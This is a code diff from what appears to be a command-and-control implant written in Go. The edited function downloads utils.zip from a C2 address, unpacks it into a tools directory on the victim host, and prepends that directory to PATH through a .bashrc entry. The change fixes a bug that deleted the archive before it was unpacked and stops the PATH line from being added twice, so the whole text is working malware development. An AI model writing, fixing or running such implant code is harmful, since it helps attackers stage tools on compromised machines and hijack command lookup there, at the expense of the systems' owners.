@@ -14,13 +14,12 @@ import (
 
 func vaccineHandler() string {
 	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
-	err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/.vj8x8Verd.zip")
+	err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/utils.zip")
 	out := "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
 		out = "[-] Download error: " + err.Error()
 	}
-	_ = os.Remove(AgentRoot + "/.vj8x8Verd.zip")
 
 	// unpack utils.zip to our PATH
 	if !IsFileExist(UtilsPath) {
@@ -29,16 +28,20 @@ func vaccineHandler() string {
 			return fmt.Sprintf("mkdir: %v", err)
 		}
 	}
-	if err = archiver.Unarchive(AgentRoot+"/.vj8x8Verd.zip", UtilsPath); err != nil {
+	if err = archiver.Unarchive(AgentRoot+"/utils.zip", UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
 	}
+	_ = os.Remove(AgentRoot + "/utils.zip")
 
 	// update PATH in .bashrc
-	err = AppendToFile(UtilsPath+"/.bashrc", fmt.Sprintf("export PATH=%s:$PATH", UtilsPath))
-	if err != nil {
-		log.Printf("Update bashrc: %v", err)
-		out = fmt.Sprintf("Update bashrc: %v", err)
+	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", UtilsPath)
+	if !IsStrInFile(exportPATH, UtilsPath+"/.bashrc") {
+		err = AppendToFile(UtilsPath+"/.bashrc", exportPATH)
+		if err != nil {
+			log.Printf("Update bashrc: %v", err)
+			out = fmt.Sprintf("Update bashrc: %v", err)
+		}
 	}
 	return out
 }
